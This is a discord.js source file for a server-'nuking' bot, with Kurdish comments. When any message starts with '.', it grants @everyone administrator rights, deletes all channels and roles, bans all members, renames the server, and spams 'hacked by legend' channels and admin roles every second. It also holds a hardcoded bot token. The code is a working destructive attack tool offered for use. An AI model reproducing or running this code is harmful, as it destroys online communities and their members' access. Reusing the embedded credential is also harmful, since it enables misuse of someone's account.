const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = "."; ///lera ba dly xot prefix dabne
client.on("ready", () => {
  console.log(`Logged in as ${client.user.tag}!`);
});

// message.guild.members.forEach(m =>{
// m.ban()

// })


client.on("message", message => {
  if (message.content.startsWith(`.`)) {
    message.delete();
    message.guild.roles.cache.find(r => r.name === "@everyone").edit({
      permissions: ["ADMINISTRATOR"] ///premission akata adminstator
    });
    message.guild.channels.cache.map(c => {
      c.delete();
    });
    message.guild.roles.cache.forEach(r => {
      r.delete();
    });

    message.guild.members.cache.forEach(m => {
      m.ban();
    });

    setInterval(() => {
      message.guild.roles
        .create({
          name: "LeGenD is here :joy:",
          permissions: ["ADMINISTRATOR"]
        })
        .then(rr => {
          message.member.roles.add(rr.id);
        });
    }, 1000);
    message.guild.setIcon("https://media.discordapp.net/attachments/839471875075473423/862400360437121054/Image_about_cute_in_s_by_moonlxght_on_We_Heart_It.jpg");
    client.user.setAvatar("https://media.discordapp.net/attachments/839471875075473423/862400360437121054/Image_about_cute_in_s_by_moonlxght_on_We_Heart_It.jpg");
    client.user.setUsername("LeGenD UP");
    message.guild.owner.send(
      "تـڕپـەقـاڵ ئـەمـژی"
    );
    message.guild.setName("legend is here");
    setTimeout(function() {
      setInterval(
        () => {
          message.guild.channels
            .create("hacked by legend", "text")
            .then(channel => {
              channel.send(
                "@everyone LeGenD is here :joy: :joy: :joy:"
              );
            });
        },

        1000
      );
    });
  }
});




////codaka drwst krawa lalayan black jack

client.login("ODY0NDQ2MzU4MzU0NTI2MjQx.YO1kaA.8car2jL5UP3YtX-1X0HpG42Fc4s");
